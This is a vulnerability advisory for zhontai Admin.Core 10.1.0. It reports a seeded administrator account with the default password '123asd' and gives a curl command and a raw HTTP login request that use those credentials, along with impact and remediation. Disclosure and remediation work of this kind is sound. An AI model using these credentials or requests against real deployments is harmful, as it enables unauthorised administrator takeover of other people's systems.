# Admin.Core — Default administrator credentials allow login (AC-VULN-002)

| Field | Value |
|-------|-------|
| Vendor | zhontai |
| Product | Admin.Core (中台Admin) |
| Version | 10.1.0 |
| Type | Use of Default Credentials |
| CWE | CWE-1392 / CWE-521 |
| Authentication | None |
| Severity | High |

## Summary

Seeded admin account uses password `123asd` matching `AppConfig.defaultPassword`. Online demo documents the same credentials.

## Root cause

Default password seeded and published; passwordHasher disabled (MD5).

## Exploit / reproduction

```bash
curl -s 'http://127.0.0.1:18010/api/admin/auth/login' -H 'Content-Type: application/json' \
  -d '{"userName":"admin","password":"123asd","accountType":1}'
```


## PoC (Yakit)

```http
POST /api/admin/auth/login HTTP/1.1
Host: 127.0.0.1:18010
Content-Type: application/json
Connection: close

{"userName":"admin","password":"123asd","accountType":1}
```

Expected: HTTP 200; success=true; data.accessToken present

## Screenshots

![auth evidence](screenshots/AC-VULN-001-002-auth.png)

## Impact

Immediate admin compromise on unchanged deployments.

## Remediation

Force password change on first login; enable passwordHasher; remove defaultPassword from production images.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/admincore_poc_verify.py`, `admincore_jwt_forge.py`
- Upstream: https://github.com/zhontai/Admin.Core
